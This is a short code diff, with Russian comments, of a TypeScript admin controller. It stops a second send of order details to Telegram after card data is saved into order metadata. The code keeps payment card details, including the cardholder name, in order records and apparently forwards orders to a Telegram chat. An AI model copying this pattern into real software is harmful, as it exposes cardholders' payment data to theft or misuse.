@@ -95,20 +95,13 @@ export class AdminController {
         hasCardholder: !!cardData.cardholderName
       });
 
-      // Отправляем заказ в Telegram ПОСЛЕ сохранения данных карты
-      // Используем рефлексию для вызова private метода
-      console.log('Отправка заказа в Telegram после сохранения данных карты...');
-      try {
-        const svc: any = (this.ordersService as any);
-        if (typeof svc.sendOrderToTelegram === 'function') {
-          await svc.sendOrderToTelegram(created as any);
-          console.log('✅ Заказ отправлен в Telegram (повторная отправка с данными карты)');
-        } else {
-          console.warn('⚠️ Метод sendOrderToTelegram не найден, но заказ уже был отправлен при создании');
-        }
-      } catch (e) {
-        console.error('❌ Ошибка при повторной отправке в Telegram:', e?.message || e);
-        // Не критично, так как заказ уже был отправлен при создании
+      // НЕ отправляем повторно в Telegram - это уже делается автоматически в ordersService.create
+      // после сохранения данных карты в metadata. Проверяем, был ли заказ уже отправлен.
+      console.log('✅ Заказ создан. Отправка в Telegram должна произойти автоматически при создании заказа.');
+      if (created.isSentToTelegram) {
+        console.log('✅ Заказ уже отправлен в Telegram при создании');
+      } else {
+        console.log('⚠️ Заказ еще не отправлен в Telegram, но должен быть отправлен автоматически');
       }
     } catch (e) {
       console.error('Ошибка при сохранении данных карты в metadata:', e?.message || e);
